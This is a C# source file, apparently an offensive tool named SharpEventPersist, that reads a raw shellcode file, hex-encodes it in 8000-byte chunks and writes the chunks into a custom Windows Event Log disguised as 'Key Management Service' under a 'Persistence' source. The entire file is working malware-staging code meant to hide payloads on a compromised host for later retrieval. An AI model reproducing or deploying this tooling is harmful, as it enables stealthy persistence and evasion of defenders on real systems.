using System;
using System.Diagnostics;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.IO;

namespace SharpEventPersist
{
    internal class Program
    {
        static void delegate_bytes(byte[] shellcode, int length, int offset = 0)
        {
            var temp = new byte[length];

            for (var i = 0; i < length; i++)
                temp[i] = shellcode[offset + i];

            string shellcodeEvent = GetBytesToString(temp);

            string source = "Persistence";
            EventLog KMSEventLog = new EventLog("Key Management Service");
            if (!EventLog.SourceExists(source))
            {
                EventLog.CreateEventSource(source, "Key Management Service");
            }
            KMSEventLog.Source = source;
            KMSEventLog.WriteEntry(shellcodeEvent, EventLogEntryType.Information, 1337);
        }

        static void Main(string[] args)
        {

            if (args == null || args.Length == 0)
            {
                Console.WriteLine("[-] Please specify raw shellcode file");
                return;
            }

            byte[] shellcode = File.ReadAllBytes(args[0]);

            var realcount = (int)(shellcode.Length / 8000);

            for (var i = 0; i < realcount; i++)
                delegate_bytes(shellcode, 8000, i * 8000);

            var remainder = (int)(shellcode.Length % 8000);
            delegate_bytes(shellcode, remainder, realcount * 8000);
        }
        public static string GetBytesToString(byte[] value)
        {
            SoapHexBinary hexbin = new SoapHexBinary(value);
            return hexbin.ToString();
        }
    }
}
